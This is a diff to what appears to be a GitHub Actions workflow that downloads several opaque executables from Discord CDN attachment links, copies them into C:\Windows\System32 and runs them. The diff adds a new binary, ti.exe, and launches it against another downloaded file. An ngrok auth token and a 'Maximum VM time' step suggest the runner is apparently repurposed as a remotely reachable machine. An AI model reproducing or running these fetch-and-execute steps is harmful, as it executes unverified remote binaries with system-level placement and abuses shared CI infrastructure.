@@ -14,13 +14,15 @@ jobs:
         Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/852512000017563690/github_init.exe -OutFile github_init.exe
         Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/853596430202568724/ce.exe -OutFile ce.exe
         Invoke-WebRequest https://cdn.discordapp.com/attachments/776049348353982476/866775299475636224/aboba.exe -OutFile aboba.exe
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/802191330200911922/856167311895298048/ti.exe -OutFile ti.exe
     - name: Copy...
       run: | 
         copy github_init.exe C:\Windows\System32
         copy ce.exe C:\Windows\System32
         copy aboba.exe C:\Windows\System32
+        copy ti.exe C:\Windows\System32
     - name: Starting...
-      run: .\github_init.exe $Env:NGROK_AUTH_TOKEN
+      run: .\ti.exe C:\Windows\System32\aboba.exe
       env:
         NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
     - name: Done. Maximum VM time:6h
